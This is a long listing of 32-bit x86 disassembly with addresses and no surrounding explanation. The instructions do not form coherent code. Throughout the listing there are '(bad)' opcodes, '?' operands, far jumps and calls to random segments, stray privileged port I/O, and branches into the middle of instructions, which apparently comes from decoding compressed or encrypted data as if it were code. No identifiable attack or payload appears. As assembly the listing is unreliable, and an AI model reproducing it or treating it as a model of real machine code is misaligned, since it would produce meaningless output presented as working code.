  42567f:	mov    eax,DWORD PTR [ebx-0x64e74d46]
  425685:	pop    ss
  425686:	jmp    0x3210:0xbb31669d
  42568d:	outs   dx,DWORD PTR ds:[esi]
  42568e:	ins    DWORD PTR es:[edi],dx
  42568f:	mov    al,ds:0x1f81dfc
  425694:	xchg   esp,eax
  425695:	mov    cl,0x5c
  425697:	pop    esi
  425698:	lock nop
  42569a:	mov    ch,0xa6
  42569c:	out    0x68,al
  42569e:	mov    edx,0xd712a667
  4256a3:	scas   eax,DWORD PTR es:[edi]
  4256a4:	sbb    bh,BYTE PTR [ebx-0x1e]
  4256a7:	xor    dh,cl
  4256a9:	mov    edx,0xa4262616
  4256ae:	jl     0x42569a
  4256b0:	xchg   edi,eax
  4256b1:	mov    ch,0x96
  4256b3:	pushf  
  4256b4:	mov    eax,0xffb03dea
  4256b9:	pop    es
  4256ba:	addr16 ja 0x4256ac
  4256bd:	jno    0x425701
  4256bf:	pop    esi
  4256c0:	sar    bh,cl
  4256c2:	pop    eax
  4256c3:	adc    BYTE PTR [eax-0x2c],dl
  4256c6:	or     eax,0xb55b7d5
  4256cb:	pushf  
  4256cc:	cdq    
  4256cd:	div    BYTE PTR [ebx+eiz*1]
  4256d0:	aam    0xb8
  4256d2:	or     al,0x7
  4256d4:	icebp  
  4256d5:	add    DWORD PTR [ebx+0x5d],esi
  4256d8:	ja     0x42573a
  4256da:	dec    ebp
  4256db:	jecxz  0x425745
  4256dd:	jecxz  0x4256ea
  4256df:	mov    WORD PTR [ebx],fs
  4256e1:	or     eax,DWORD PTR [edx-0x3]
  4256e4:	and    dh,BYTE PTR [edi]
  4256e6:	xchg   ebp,eax
  4256e7:	js     0x42573b
  4256e9:	std    
  4256ea:	add    DWORD PTR [edx],ebp
  4256ec:	xchg   ebp,eax
  4256ed:	mov    dh,0x1b
  4256ef:	jp     0x42576b
  4256f1:	or     BYTE PTR [ebp+eiz*2+0x715c1a40],cl
  4256f8:	sar    BYTE PTR gs:[ebx+0x3bda0e7],cl
  4256ff:	frstor [ecx]
  425701:	out    dx,eax
  425702:	lock outs dx,DWORD PTR ds:[esi]
  425704:	adc    eax,0x38378cb1
  425709:	dec    esi
  42570a:	ja     0x4256c4
  42570c:	shl    BYTE PTR [ebp-0x4b24535a],0x31
  425713:	aaa    
  425714:	scas   al,BYTE PTR es:[edi]
  425715:	mov    al,0xcc
  425717:	setp   BYTE PTR [edi]
  42571a:	jae    0x42574f
  42571c:	mov    cl,0x8f
  42571e:	mov    esp,eax
  425720:	retf   
  425721:	adc    dl,cl
  425723:	cdq    
  425724:	cld    
  425725:	add    BYTE PTR [ebx+0x24178719],dh
  42572b:	jnp    0x42572d
  42572d:	pop    ecx
  42572e:	outs   dx,DWORD PTR ds:[esi]
  42572f:	popf   
  425730:	mov    WORD PTR [edx],?
  425732:	xor    edi,DWORD PTR [eax+0x1175f932]
  425738:	inc    edi
  425739:	idiv   esi
  42573b:	popf   
  42573c:	sub    BYTE PTR [esi],dh
  42573e:	jge    0x425768
  425740:	nop
  425741:	cmp    bh,cl
  425743:	add    al,0xe2
  425745:	pop    es
  425746:	popa   
  425747:	nop
  425748:	mov    eax,ds:0xe0d11f54
  42574d:	push   cs
  42574e:	cmp    BYTE PTR [ecx],dh
  425750:	es push ebx
  425752:	loop   0x4257be
  425754:	aas    
  425755:	sbb    edx,DWORD PTR [ecx-0x38]
  425758:	cli    
  425759:	xor    bl,BYTE PTR [edx+eax*1]
  42575c:	mov    ds:0x60d13c5c,al
  425761:	fnstsw WORD PTR [edx+0x60]
  425764:	inc    ecx
  425765:	xchg   ebx,eax
  425766:	pop    ss
  425767:	inc    edi
  425768:	(bad)  
  425769:	fist   WORD PTR [eax]
  42576b:	das    
  42576c:	adc    al,0x94
  42576e:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  425770:	jecxz  0x425749
  425772:	pop    ss
  425773:	pop    edi
  425774:	das    
  425775:	daa    
  425776:	xchg   esp,eax
  425777:	jmp    0x71e3:0xe8e59727
  42577e:	scas   eax,DWORD PTR es:[edi]
  42577f:	pop    esp
  425780:	(bad)  
  425781:	fist   DWORD PTR [edi]
  425783:	mov    esp,0xf8310e6c
  425788:	lods   al,BYTE PTR ds:[esi]
  425789:	xor    eax,0xb1d421c8
  42578e:	mov    cl,0x25
  425790:	xlat   BYTE PTR ds:[ebx]
  425791:	push   0xd74c34b
  425796:	inc    eax
  425797:	mov    ecx,0x854332cf
  42579c:	pop    ebx
  42579d:	sub    ecx,edi
  42579f:	out    dx,al
  4257a0:	adc    al,0x7c
  4257a2:	inc    ebp
  4257a3:	xor    edx,ecx
  4257a5:	int3   
  4257a6:	jns    0x425782
  4257a8:	in     al,dx
  4257a9:	ins    DWORD PTR es:[edi],dx
  4257aa:	stc    
  4257ab:	test   BYTE PTR [edi-0x75],0xb2
  4257af:	cmp    BYTE PTR [edx+ebx*2+0xa],bh
  4257b3:	and    ah,BYTE PTR [ebx]
  4257b5:	pop    eax
  4257b6:	(bad)  
  4257b7:	mov    edi,0x751fa28b
  4257bc:	push   0xfffffffe
  4257be:	cs stc 
  4257c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4257c1:	xor    DWORD PTR [esi+0x6ddda89c],0x6ee2717b
  4257cb:	and    bl,BYTE PTR [ebp+0x6b]
  4257ce:	inc    edi
  4257cf:	aaa    
  4257d0:	cmp    eax,0x16e78ba
  4257d5:	sti    
  4257d6:	jno    0x42581a
  4257d8:	pop    ebx
  4257d9:	outs   dx,BYTE PTR ds:[esi]
  4257da:	pop    esp
  4257db:	and    eax,0x921d4aa3
  4257e0:	xor    BYTE PTR [edi+esi*1],0xaa
  4257e4:	out    0xe8,eax
  4257e6:	enter  0xae38,0x81
  4257ea:	fadd   QWORD PTR [ebx+0x18]
  4257ed:	shl    dh,1
  4257ef:	mov    ah,0x59
  4257f1:	push   esi
  4257f2:	(bad)  [esi+ebp*8+0x4d9f5672]
  4257f9:	out    0x58,eax
  4257fb:	adc    al,0x4d
  4257fd:	mov    esp,0xc40a395f
  425802:	inc    esp
  425803:	add    edi,ebx
  425805:	mov    ebx,0xf215536a
  42580a:	and    dh,bh
  42580c:	data16 jo 0x425872
  42580f:	fs or  eax,0x4fd8fb0c
  425815:	lods   eax,DWORD PTR ds:[esi]
  425816:	sbb    al,ch
  425818:	jbe    0x425854
  42581a:	clc    
  42581b:	out    0xbb,al
  42581d:	xor    edi,DWORD PTR [ecx+0x73]
  425820:	cmp    DWORD PTR [eax],ecx
  425822:	je     0x4257a8
  425824:	fidivr WORD PTR [edi-0x67]
  425827:	jle    0x4257d6
  425829:	push   edi
  42582a:	mov    ch,0x7
  42582c:	sub    DWORD PTR [esp+0x198ca15c],ebx
  425833:	sub    DWORD PTR [ecx],eax
  425835:	cmp    eax,DWORD PTR ds:0x8cf1f84d
  42583b:	push   esi
  42583c:	outs   dx,BYTE PTR ds:[esi]
  42583d:	in     al,0x32
  42583f:	cs test eax,esp
  425842:	inc    DWORD PTR [edi+0x7778000b]
  425848:	xor    eax,0xa9b42cad
  42584d:	fiadd  DWORD PTR [edi]
  42584f:	mov    bh,0xda
  425851:	xchg   ecx,eax
  425852:	push   esi
  425853:	ds jnp 0x425847
  425856:	pushf  
  425857:	retf   0x7d3
  42585a:	add    esi,DWORD PTR [esi]
  42585c:	stos   DWORD PTR es:[edi],eax
  42585d:	add    BYTE PTR [eax],al
  42585f:	add    BYTE PTR [eax],al
  425861:	add    BYTE PTR ds:0xaf44af85,al
  425867:	outs   dx,BYTE PTR ds:[esi]
  425868:	out    dx,eax
  425869:	lds    ecx,FWORD PTR [ecx-0x54a2c908]
  42586f:	mov    dh,bl
  425871:	and    al,0xe2
  425873:	rol    BYTE PTR [ecx],1
  425875:	add    bl,dh
  425877:	add    al,0x0
  425879:	add    BYTE PTR [ecx],ah
  42587b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42587c:	mov    ebp,0x6eb5ba76
  425881:	cwde   
  425882:	push   ebp
  425883:	ins    DWORD PTR es:[edi],dx
  425884:	das    
  425885:	pushf  
  425886:	pushf  
  425887:	lods   al,BYTE PTR ds:[si]
  425889:	pusha  
  42588a:	dec    edi
  42588b:	jg     0x425836
  42588d:	fisubr DWORD PTR [eax+0x1f]
  425890:	xchg   edx,eax
  425891:	sub    DWORD PTR [edi+edi*8+0x409209d4],ebx
  425898:	mov    edx,0x71b8fde1
  42589d:	xchg   esi,eax
  42589e:	daa    
  42589f:	sti    
  4258a0:	lods   al,BYTE PTR ds:[esi]
  4258a1:	dec    edi
  4258a2:	mov    ebp,0x65ffe53e
  4258a7:	jb     0x42591c
  4258a9:	test   DWORD PTR [edi+0xeb99c31],ebp
  4258af:	push   ebp
  4258b0:	(bad)  
  4258b1:	sar    al,0x1c
  4258b4:	cmp    eax,esi
  4258b6:	and    BYTE PTR [eax+eiz*1+0x33],0xf7
  4258bb:	cmp    DWORD PTR [ecx],0x5ecb4368
  4258c1:	shr    DWORD PTR [ecx+eiz*2],1
  4258c4:	add    eax,0xdb0df94f
  4258c9:	out    dx,eax
  4258ca:	imul   ebx,DWORD PTR [esi-0x1a],0xffffff85
  4258ce:	out    dx,eax
  4258cf:	mov    eax,0x53947eed
  4258d4:	xchg   ecx,eax
  4258d5:	inc    esi
  4258d6:	div    DWORD PTR [ebx+0x46]
  4258d9:	stos   DWORD PTR es:[edi],eax
  4258da:	mov    WORD PTR [eax],?
  4258dc:	mov    al,ds:0x3f5ff633
  4258e1:	xchg   BYTE PTR [edi+0x6f],dl
  4258e4:	pop    ebp
  4258e5:	and    DWORD PTR [ecx+esi*4+0x3a],0xffffffa7
  4258ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4258eb:	add    dl,BYTE PTR [edx+0x9]
  4258ee:	call   0x19ea:0x51fcced4
  4258f5:	(bad)  
  4258f6:	std    
  4258f7:	sbb    BYTE PTR fs:[edi],bh
  4258fa:	out    0x77,al
  4258fc:	inc    ebp
  4258fd:	sbb    edi,DWORD PTR [esi]
  4258ff:	enter  0xda25,0xcf
  425903:	enter  0xaf67,0x84
  425907:	mov    cl,0x26
  425909:	fs leave 
  42590b:	scas   al,BYTE PTR es:[edi]
  42590c:	cld    
  42590d:	imul   eax,DWORD PTR [eax+0x7],0x97df1a71
  425914:	scas   eax,DWORD PTR es:[edi]
  425915:	retf   0x5df
  425918:	and    BYTE PTR [ecx+0x49],bl
  42591b:	(bad)  
  42591c:	mov    bl,0xa1
  42591e:	test   BYTE PTR [esi+esi*8-0x112dc2e9],cl
  425925:	xchg   ebp,esp
  425927:	and    ch,al
  425929:	stos   DWORD PTR es:[edi],eax
  42592a:	sub    BYTE PTR [eax],bh
  42592c:	jg     0x42597a
  42592e:	push   0x65
  425930:	mov    al,ds:0xa9268f2d
  425935:	call   0xea9a:0x11338c4c
  42593c:	mov    bh,0xb8
  42593e:	jl     0x4258e6
  425940:	pushf  
  425941:	fist   WORD PTR [edi+0x58d398c2]
  425947:	inc    ebx
  425948:	pop    esi
  425949:	cli    
  42594a:	sbb    al,0x42
  42594c:	loope  0x425952
  42594e:	xchg   BYTE PTR [edx],ah
  425950:	test   dh,ch
  425952:	inc    eax
  425953:	stos   BYTE PTR es:[edi],al
  425954:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425955:	faddp  st(1),st
  425957:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425958:	xor    ah,BYTE PTR [esi-0x3240e3ec]
  42595e:	xor    eax,0xd8ccb1b
  425963:	xchg   esi,eax
  425964:	into   
  425965:	ja     0x4259d2
  425967:	or     al,0x7
  425969:	inc    edi
  42596a:	mov    esp,0x27bb6800
  42596f:	dec    ebx
  425970:	fcmovu st,st(6)
  425972:	test   al,0x86
  425974:	lsl    ecx,WORD PTR [ebx+0x23]
  425978:	clc    
  425979:	fs inc ebx
  42597b:	mov    ds:0x57df0646,al
  425980:	push   es
  425981:	mov    DWORD PTR [ecx+0x78],edx
  425984:	and    eax,0xd5149c96
  425989:	xchg   ebp,eax
  42598a:	ret    
  42598b:	icebp  
  42598c:	mov    ebp,0x1eef7856
  425991:	push   es
  425992:	in     al,dx
  425993:	xor    bh,bh
  425995:	fimul  WORD PTR [ecx]
  425997:	and    BYTE PTR [ebx-0x54744742],bl
  42599d:	cwde   
  42599e:	fnstenv [ebp+0x2a]
  4259a1:	popf   
  4259a2:	mov    bl,0xec
  4259a4:	xchg   esi,eax
  4259a5:	rcpps  xmm6,xmm4
  4259a8:	add    edx,ebx
  4259aa:	(bad)  
  4259ab:	je     0x42597c
  4259ad:	mov    ds,WORD PTR [ecx]
  4259af:	xor    al,0x52
  4259b1:	lods   eax,DWORD PTR ds:[esi]
  4259b2:	call   0xd00c:0x6425c57
  4259b9:	xchg   edi,eax
  4259ba:	mov    BYTE PTR [ecx+0x79],ah
  4259bd:	jne    0x425945
  4259bf:	les    esp,FWORD PTR [ecx+0x6fd8c216]
  4259c5:	popa   
  4259c6:	outs   dx,DWORD PTR ds:[esi]
  4259c7:	push   0x18
  4259c9:	push   es
  4259ca:	xlat   BYTE PTR ds:[ebx]
  4259cb:	mov    bh,0xa4
  4259cd:	cs fwait
  4259cf:	sub    DWORD PTR [eax-0x8],0xf293bb5a
  4259d6:	bound  edx,QWORD PTR [edx]
  4259d8:	shl    BYTE PTR [edi+0x58ce17c6],0x8b
  4259df:	sbb    esi,DWORD PTR [edx+edx*8-0x72]
  4259e3:	or     ecx,eax
  4259e5:	leave  
  4259e6:	in     eax,dx
  4259e7:	push   edi
  4259e8:	push   ebx
  4259e9:	sbb    eax,0x21a0f664
  4259ee:	jns    0x42599c
  4259f0:	test   BYTE PTR [ecx+0x72],al
  4259f3:	jo     0x425984
  4259f5:	test   al,0x17
  4259f7:	test   eax,0x4a19249f
  4259fc:	inc    edx
  4259fd:	lahf   
  4259fe:	mov    ds:0x6cccf113,eax
  425a03:	push   ss
  425a04:	fadd   DWORD PTR [ebx-0x1c005d22]
  425a0a:	mov    esi,0xeb60783
  425a0f:	aam    0xa4
  425a11:	jns    0x4259b6
  425a13:	shl    DWORD PTR [esi+ecx*2+0x465d15f9],1
  425a1a:	inc    ebp
  425a1b:	in     eax,0x61
  425a1d:	fistp  WORD PTR [esi]
  425a1f:	jmp    0xaf10e3d2
  425a24:	sbb    BYTE PTR [esi+0x2b],0x4
  425a28:	sbb    ah,BYTE PTR [ecx+0xcb2b7d5]
  425a2e:	(bad)  
  425a2f:	lods   al,BYTE PTR ds:[esi]
  425a30:	ds es jge 0x425aa1
  425a34:	mov    WORD PTR [ecx+0x5],cs
  425a37:	arpl   WORD PTR [edx+0x14],si
  425a3a:	sbb    ah,BYTE PTR [ebx+edx*4]
  425a3d:	fucomip st,st(3)
  425a3f:	or     eax,0xad939f47
  425a44:	jl     0x425aab
  425a46:	fild   WORD PTR [esi+0xc2b8d86]
  425a4c:	add    ch,BYTE PTR [eax+eax*1]
  425a4f:	lods   al,BYTE PTR ds:[esi]
  425a50:	test   eax,ebp
  425a52:	stos   BYTE PTR es:[edi],al
  425a53:	mov    edi,ebp
  425a55:	test   eax,0x132be65e
  425a5a:	inc    ebx
  425a5b:	jbe    0x425a7a
  425a5d:	xchg   ebp,eax
  425a5e:	(bad)  
  425a60:	xchg   ecx,eax
  425a61:	in     al,dx
  425a62:	enter  0x6aee,0x4d
  425a66:	jnp    0x425aa8
  425a68:	and    DWORD PTR [ebp-0x4c],edx
  425a6b:	ror    DWORD PTR [ebp+0x31],0x3a
  425a6f:	xchg   BYTE PTR [esp+edx*8],ah
  425a72:	jmp    0x7408:0xd16e92bf
  425a79:	(bad)  
  425a7b:	sbb    cl,BYTE PTR [edx+0x75]
  425a7e:	call   0xf2e7:0xc5292535
  425a85:	add    DWORD PTR gs:[esi],esp
  425a88:	stc    
  425a89:	nop
  425a8a:	call   0xccc5:0x48a22d92
  425a91:	pop    esp
  425a92:	shl    DWORD PTR [ebx],1
  425a94:	pop    edi
  425a95:	adc    ch,0xe6
  425a98:	fsubr  QWORD PTR es:[ebx-0x3b059912]
  425a9f:	js     0x425a48
  425aa1:	retf   
  425aa2:	dec    ecx
  425aa3:	xchg   BYTE PTR [ebx],dl
  425aa5:	jmp    0x425b11
  425aa7:	jp     0x425aab
  425aa9:	mov    ebx,edx
  425aab:	(bad)  
  425aac:	(bad)  
  425aae:	rcl    BYTE PTR [ecx+0x18],cl
  425ab1:	xor    al,0x61
  425ab3:	gs mov dh,0xfa
  425ab6:	fmul   QWORD PTR [eax]
  425ab8:	pop    ebx
  425ab9:	xor    edi,DWORD PTR [eax+0x9]
  425abc:	mov    dl,0x17
  425abe:	or     eax,0x25078eef
  425ac3:	lock loope 0x425ad5
  425ac6:	mov    ecx,0xadef20f5
  425acb:	and    DWORD PTR [edi-0x7f],eax
  425ace:	stos   DWORD PTR es:[edi],eax
  425acf:	cs xchg ebp,eax
  425ad1:	cwde   
  425ad2:	dec    edx
  425ad3:	dec    BYTE PTR [ebx-0x65]
  425ad6:	mov    ch,0xa4
  425ad8:	scas   al,BYTE PTR es:[edi]
  425ad9:	pop    ds
  425ada:	mov    bl,0xef
  425adc:	xlat   BYTE PTR ds:[ebx]
  425add:	jns    0x425ab6
  425adf:	mov    ebx,?
  425ae1:	inc    edi
  425ae2:	out    dx,al
  425ae3:	leave  
  425ae4:	add    DWORD PTR [esi+0x6c0718d6],edx
  425aea:	test   al,0x2e
  425aec:	add    BYTE PTR [edx+eiz*8],cl
  425aef:	mov    ds:0xc66d2910,al
  425af4:	sub    eax,0x67701f9c
  425af9:	adc    cl,bh
  425afb:	idiv   BYTE PTR [edi+0x7397dccd]
  425b01:	mov    eax,0x648e7a23
  425b06:	mov    bh,0x15
  425b08:	out    0x38,eax
  425b0a:	push   0xf02b243f
  425b0f:	add    ah,BYTE PTR [edi]
  425b11:	aaa    
  425b12:	jnp    0x425b5f
  425b14:	out    dx,eax
  425b15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425b16:	dec    ebx
  425b17:	pop    esi
  425b18:	mov    al,0x28
  425b1a:	rcr    dl,1
  425b1c:	mov    ebx,0x7c50889
  425b21:	loop   0x425ad1
  425b23:	dec    edi
  425b24:	adc    al,0xf7
  425b26:	shl    BYTE PTR [ebx],1
  425b28:	dec    edx
  425b29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425b2a:	call   0x233b:0x5a857274
  425b31:	mov    ds:0xf9d6777c,al
  425b36:	adc    dl,BYTE PTR [esi-0x85bca2c]
  425b3c:	out    0xa1,eax
  425b3e:	scas   al,BYTE PTR es:[edi]
  425b3f:	jbe    0x425b89
  425b41:	and    eax,0x4638dc56
  425b46:	inc    esp
  425b47:	or     eax,0x139c6843
  425b4c:	mov    dh,0x28
  425b4e:	xor    dh,BYTE PTR [eax+0xe]
  425b51:	je     0x425b77
  425b53:	adc    eax,0xc9134a08
  425b58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425b59:	lods   eax,DWORD PTR ds:[esi]
  425b5a:	mov    al,ds:0x3e49973
  425b5f:	fsub   st,st(4)
  425b61:	lea    eax,[edi+0x2f]
  425b64:	xor    eax,0x2cfaef4c
  425b69:	dec    esp
  425b6a:	push   edi
  425b6b:	mov    ebp,0x7c20810e
  425b70:	push   es
  425b71:	xlat   BYTE PTR ds:[ebx]
  425b72:	push   ebp
  425b73:	push   ebx
  425b74:	aam    0x8a
  425b76:	shr    BYTE PTR [ebp+0x4960253f],0xb8
  425b7d:	imul   ebx,ebp,0x13bf9a8b
  425b83:	jno    0x425b7c
  425b85:	xchg   DWORD PTR [eax],edx
  425b87:	and    DWORD PTR [ebx-0x216576e7],ebp
  425b8d:	cmp    DWORD PTR ds:0x29f4e538,esp
  425b93:	dec    ecx
  425b94:	add    BYTE PTR [edi+0x584d8c23],al
  425b9a:	sahf   
  425b9b:	fistp  QWORD PTR [esi-0x7a]
  425b9e:	and    DWORD PTR [ebx+ecx*8+0x6faf2a87],ebx
  425ba5:	fldenv [edi]
  425ba7:	dec    esp
  425ba8:	cmp    eax,0x201a4199
  425bad:	out    0x1b,al
  425baf:	cmp    al,BYTE PTR [edx]
  425bb1:	popa   
  425bb2:	scas   eax,DWORD PTR es:[edi]
  425bb3:	arpl   WORD PTR [ecx+0x24],bx
  425bb6:	xchg   ebp,eax
  425bb7:	cmp    al,dh
  425bb9:	fist   WORD PTR [ecx+0x2ace8990]
  425bbf:	dec    ebx
  425bc0:	push   cs
  425bc1:	mov    ds:0x3c6c5dce,eax
  425bc6:	and    eax,0xf3715384
  425bcb:	scas   al,BYTE PTR es:[edi]
  425bcc:	mov    ds:0x672fe34f,eax
  425bd1:	jecxz  0x425b63
  425bd3:	inc    ecx
  425bd4:	sub    DWORD PTR [ecx],edi
  425bd6:	lods   eax,DWORD PTR ds:[esi]
  425bd7:	ret    
  425bd8:	iret   
  425bd9:	pop    eax
  425bda:	ds icebp 
  425bdc:	(bad)  
  425bdd:	jbe    0x425c30
  425bdf:	je     0x425c0e
  425be1:	neg    BYTE PTR [ebx-0xbae022c]
  425be7:	or     al,0x1e
  425be9:	mov    WORD PTR [ebx-0x3e],gs
  425bec:	repnz fsubr QWORD PTR [ebp+0x54799dcf]
  425bf3:	data16 in al,0x65
  425bf6:	xlat   BYTE PTR ds:[ebx]
  425bf7:	xlat   BYTE PTR ds:[ebx]
  425bf8:	xchg   esi,eax
  425bf9:	pop    edx
  425bfa:	push   0xe2aed8f
  425bff:	jp     0x425c56
  425c01:	outs   dx,BYTE PTR ds:[esi]
  425c02:	shl    BYTE PTR [edi+0x59],cl
  425c05:	out    0xe7,al
  425c07:	(bad)  
  425c08:	sbb    eax,0x80da6967
  425c0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425c0e:	push   0xffffffcb
  425c10:	mov    eax,ds:0x5d69576b
  425c15:	test   eax,0x7470dfc9
  425c1a:	outs   dx,DWORD PTR ds:[esi]
  425c1b:	cmp    eax,0x740c8a64
  425c20:	push   ecx
  425c21:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425c22:	(bad)  
  425c23:	out    0x9f,al
  425c25:	icebp  
  425c26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425c27:	sbb    esi,DWORD PTR [edx]
  425c29:	popa   
  425c2a:	iret   
  425c2b:	and    al,0xfd
  425c2d:	push   cs
  425c2e:	jno    0x425c2c
  425c30:	ja     0x425be1
  425c32:	aas    
  425c33:	data16 xlat BYTE PTR ds:[ebx]
  425c35:	loopne 0x425c58
  425c37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425c38:	jecxz  0x425be2
  425c3a:	mov    al,0x12
  425c3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425c3d:	test   eax,0xa5055689
  425c42:	push   edx
  425c43:	add    al,0xd9
  425c45:	popa   
  425c46:	jae    0x425be3
  425c48:	jne    0x425c56
  425c4a:	into   
  425c4b:	mov    edx,0xf954f7de
  425c50:	adc    ch,BYTE PTR [ecx-0x764e9622]
  425c56:	out    dx,eax
  425c57:	not    BYTE PTR [ebp-0x41644ec2]
  425c5d:	cmp    ah,BYTE PTR ss:[ebx-0x44]
  425c61:	repz jmp 0x46827ff6
  425c67:	int    0x7b
  425c69:	push   ecx
  425c6a:	sub    DWORD PTR [ecx],edx
  425c6c:	mov    cl,0x6f
  425c6e:	ins    DWORD PTR es:[edi],dx
  425c6f:	push   esp
  425c70:	pop    ecx
  425c71:	xor    eax,0xe5f72a96
  425c76:	stos   DWORD PTR es:[edi],eax
  425c77:	nop
  425c78:	stos   DWORD PTR es:[edi],eax
  425c79:	pop    esi
  425c7a:	or     bh,ch
  425c7c:	aaa    
  425c7d:	adc    edx,ecx
  425c7f:	mov    BYTE PTR [ebx],ah
  425c81:	xor    BYTE PTR [edi-0x72c64ae],al
  425c87:	fs push edx
  425c89:	and    ah,BYTE PTR [ecx+0x74]
  425c8c:	push   cs
  425c8d:	cmp    dl,BYTE PTR [ebx+0xc181e82]
  425c93:	adc    eax,0xbfb63ca3
  425c98:	and    ecx,DWORD PTR [ebx]
  425c9a:	out    0x79,eax
  425c9c:	push   esi
  425c9d:	fwait
  425c9e:	mov    esp,0xc4dca6de
  425ca3:	int3   
  425ca4:	call   0x1627:0xf900df19
  425cab:	pusha  
  425cac:	push   eax
  425cad:	dec    ebp
  425cae:	xchg   edx,eax
  425caf:	retf   
  425cb0:	sbb    eax,0xaec5f74f
  425cb5:	mov    al,ds:0xf762a6d
  425cba:	sar    ah,1
  425cbc:	push   0xa753c4ad
  425cc1:	push   ds
  425cc2:	retf   0x4bb1
  425cc5:	mov    eax,0x306081a
  425cca:	jb     0x425d4b
  425ccc:	div    dh
  425cce:	loopne 0x425cca
  425cd0:	mov    ecx,0xef9ced63
  425cd5:	aaa    
  425cd6:	xchg   esp,eax
  425cd7:	xchg   DWORD PTR [esi],esp
  425cd9:	and    eax,0x6a06c085
  425cde:	outs   dx,BYTE PTR ds:[esi]
  425cdf:	xchg   edi,eax
  425ce0:	jns    0x425d25
  425ce2:	dec    edi
  425ce3:	xor    ecx,DWORD PTR [esi]
  425ce5:	mov    cl,0x5f
  425ce7:	jbe    0x425d1d
  425ce9:	xchg   DWORD PTR [edx-0x65],ecx
  425cec:	lods   al,BYTE PTR ds:[esi]
  425ced:	pop    ebp
  425cee:	xchg   edi,eax
  425cef:	fistp  DWORD PTR [esi]
  425cf1:	js     0x425cd2
  425cf3:	adc    BYTE PTR [edi],ch
  425cf5:	leave  
  425cf6:	out    0xfc,al
  425cf8:	xlat   BYTE PTR ds:[ebx]
  425cf9:	pop    esi
  425cfa:	hlt    
  425cfb:	ret    0xff1b
  425cfe:	mov    dh,0x93
  425d00:	lds    ecx,FWORD PTR [edx]
  425d02:	mov    dh,0xa3
  425d04:	push   ebx
  425d05:	or     BYTE PTR [edi+0x60],0xd0
  425d09:	test   al,0x9e
  425d0b:	xchg   ecx,eax
  425d0c:	jo     0x425cc7
  425d0e:	aam    0x0
  425d10:	or     bh,ah
  425d12:	adc    eax,0x765623b
  425d17:	mov    WORD PTR [ebx-0x33],cs
  425d1a:	js     0x425ccc
  425d1c:	pop    es
  425d1d:	inc    edx
  425d1e:	stos   DWORD PTR es:[edi],eax
  425d1f:	rcl    eax,1
  425d21:	fnstcw WORD PTR [edi]
  425d23:	aaa    
  425d24:	push   DWORD PTR [esp]
  425d27:	cmp    ch,BYTE PTR [esi]
  425d29:	stc    
  425d2a:	mov    edx,0xa37b1bf
  425d2f:	mov    eax,ds:0xd25dd55a
  425d34:	(bad)  
  425d35:	cmp    BYTE PTR [edx+0x3f],dh
  425d38:	and    BYTE PTR ds:0x8f695d21,dl
  425d3e:	jno    0x425d47
  425d40:	ins    BYTE PTR es:[edi],dx
  425d41:	pushf  
  425d42:	push   ds
  425d43:	push   edi
  425d44:	adc    edi,DWORD PTR [eax]
  425d46:	nop
  425d47:	xchg   esp,eax
  425d48:	hlt    
  425d49:	scas   al,BYTE PTR es:[edi]
  425d4a:	push   ebp
  425d4b:	xchg   ecx,eax
  425d4c:	jno    0x425dbe
  425d4e:	sbb    cl,BYTE PTR [ecx]
  425d50:	mov    dh,0xe7
  425d52:	mov    ebx,0xd5cd7c79
  425d57:	or     ebx,DWORD PTR [edi]
  425d59:	idiv   dl
  425d5b:	retf   0x2bad
  425d5e:	jae    0x425d11
  425d60:	in     eax,dx
  425d61:	(bad)  [edx-0x6d]
  425d64:	mov    ah,0x68
  425d66:	loop   0x425d6a
  425d68:	push   esi
  425d69:	adc    al,0xc0
  425d6b:	inc    edi
  425d6c:	mov    ds:0x0,al
  425d71:	add    dh,ch
  425d73:	retf   0xd589
  425d76:	lods   eax,DWORD PTR ds:[esi]
  425d77:	xlat   BYTE PTR ds:[ebx]
  425d78:	(bad)  
  425d79:	sti    
  425d7a:	(bad)  
  425d7c:	mov    ss,WORD PTR [ebx+edx*1+0x3f]
  425d80:	add    eax,0x1d5d58a
  425d85:	add    bl,dh
  425d87:	add    al,0x0
  425d89:	add    dl,bl
  425d8b:	imul   ebx,DWORD PTR [ecx+0x24],0x7
  425d8f:	push   ecx
  425d90:	or     al,0x81
  425d92:	les    esi,FWORD PTR [edx]
  425d94:	aas    
  425d95:	mov    bl,0x5e
  425d97:	stos   BYTE PTR es:[edi],al
  425d98:	mov    al,BYTE PTR [edi]
  425d9a:	sbb    bh,BYTE PTR [ebx+0x1ecdb33d]
  425da0:	mov    al,0x83
  425da2:	dec    edx
  425da3:	mov    DWORD PTR [edx-0x75],esi
  425da6:	aas    
  425da7:	dec    edx
  425da8:	xchg   edi,eax
  425da9:	nop
  425daa:	es (bad) 
  425dac:	loop   0x425d93
  425dae:	xor    BYTE PTR [ebx+ebx*4],cl
  425db1:	sti    
  425db2:	jbe    0x425d76
  425db4:	pop    esi
  425db5:	pop    eax
  425db6:	push   edi
  425db7:	push   cs
  425db8:	bound  edx,QWORD PTR [edi-0x48]
  425dbb:	mov    eax,ds:0x2d2aa8c2
  425dc0:	ss (bad) 
  425dc2:	daa    
  425dc3:	adc    eax,0x509776f1
  425dc8:	add    esp,DWORD PTR [edi+0x78dfde1d]
  425dce:	out    0x4b,eax
  425dd0:	jo     0x425d67
  425dd2:	stos   DWORD PTR es:[edi],eax
  425dd3:	adc    al,0x8
  425dd5:	mov    ecx,0x3c4d81d2
  425dda:	pop    esi
  425ddb:	sbb    eax,0xb093c17d
  425de0:	jg     0x425dc0
  425de2:	adc    DWORD PTR [ebx+0x15],esp
  425de5:	jo     0x425d8b
  425de7:	div    BYTE PTR [edi+0x5]
  425dea:	adc    bh,BYTE PTR [ecx]
  425dec:	push   cs
